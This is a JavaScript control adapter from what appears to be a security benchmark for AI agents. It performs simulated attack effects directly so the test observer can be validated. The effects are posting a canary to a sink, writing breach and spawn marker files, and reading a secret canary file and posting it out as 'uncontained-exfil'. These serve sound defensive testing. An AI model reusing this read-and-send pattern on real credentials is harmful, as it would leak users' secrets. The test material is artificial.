// Uncontained control adapter. It imports nothing from AMC and applies NO
// governance: it performs each attack's effect directly against the observer's
// sinks. Its only purpose is a validity control — if the observer and oracle
// are working, this config's attack success rate is ~100%, which proves a clean
// amc-native result is a real denial and not a blind observer.
//
// This is NOT a harness and NOT a model run. It never gates anything and must
// never be read as "Pi without AMC" (that is the separate, pluggable pi-baseline
// config, which needs a real qualified Pi install).
import { writeFileSync } from "node:fs";
import { join } from "node:path";

export async function setupUncontainedControl() {
  return { config: "uncontained-control", async close() {} };
}

export async function runTrial(ctx, env, variant) {
  const trialId = `${ctx.config}:${variant.taskId}:v${variant.variantIndex}`;
  // Deliver the payload to the gateway (same as any agent under test).
  try {
    await fetch(`${env.gatewayOrigin}/gateway`, { method: "POST", headers: { "content-type": "application/json", connection: "close" }, body: JSON.stringify({ trialId, prompt: variant.renderedPrompt, canary: variant.canary }) });
  } catch { /* observer marks inconclusive if the gateway is down */ }
  const effector = variant.attack.effector;
  try {
    if (effector === "egress") {
      await fetch(`${env.sinkOrigin}/sink?trial=${encodeURIComponent(trialId)}&host=uncontained`, { method: "POST", headers: { connection: "close" }, body: variant.canary }).catch(() => {});
    } else if (effector === "fsWrite") {
      writeFileSync(join(env.sentinels, `breach-${trialId}`), `uncontained ${trialId}\n`);
    } else if (effector === "fsRead") {
      const canary = env.secretCanaries[variant.attack.target.secretName];
      if (canary) {
        const { readFileSync } = await import("node:fs");
        await fetch(`${env.sinkOrigin}/sink?trial=${encodeURIComponent(trialId)}&host=uncontained-exfil`, { method: "POST", headers: { connection: "close" }, body: readFileSync(canary.file) }).catch(() => {});
      }
    } else if (effector === "spawn") {
      writeFileSync(join(env.markers, `spawn-${trialId}`), `uncontained spawn ${trialId}\n`);
    }
  } catch { /* an effector that cannot run still reports attempted */ }
  return { trialId, config: ctx.config, taskId: variant.taskId, attackClass: variant.attackClass, variantIndex: variant.variantIndex, amcDecision: "allow", stoppedLayer: "none", effectorAttempted: true, detail: "uncontained control: effect performed directly" };
}
